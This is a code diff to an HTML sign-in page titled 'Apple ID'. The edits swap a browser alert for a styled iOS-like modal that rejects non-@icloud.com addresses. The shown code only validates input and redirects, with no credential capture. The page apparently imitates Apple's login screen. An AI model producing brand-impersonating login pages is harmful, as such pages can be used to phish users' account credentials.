@@ -5,9 +5,7 @@
   <title>Apple ID</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
@@ -102,6 +100,47 @@
       margin-top: 24px;
       text-decoration: none;
     }
+
+    /* iOS-style Alert Box */
+    #ios-alert .alert-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background-color: rgba(0,0,0,0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 99;
+    }
+
+    #ios-alert .alert-box {
+      width: 280px;
+      background-color: #fff;
+      border-radius: 14px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+      text-align: center;
+      padding: 24px 16px;
+    }
+
+    .alert-title {
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .alert-message {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    .alert-button {
+      font-size: 17px;
+      color: #007aff;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
@@ -122,13 +161,23 @@
     <a href="#" class="footer-link">Other Sign-In Options</a>
   </div>
 
+  <div id="ios-alert" style="display: none;">
+    <div class="alert-overlay">
+      <div class="alert-box">
+        <div class="alert-title">Invalid email</div>
+        <div class="alert-message">You can only use @icloud.com emails</div>
+        <button class="alert-button" onclick="closeAlert()">Try again</button>
+      </div>
+    </div>
+  </div>
+
   <script>
     function validateLogin() {
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
 
       if (!email.endsWith('@icloud.com')) {
-        alert('Only @icloud.com addresses are supported.');
+        document.getElementById('ios-alert').style.display = 'block';
         return;
       }
 
@@ -138,6 +187,10 @@
       }
 
       window.location.href = 'terms.html';
+    }
+
+    function closeAlert() {
+      document.getElementById('ios-alert').style.display = 'none';
     }
   </script>
 </body>
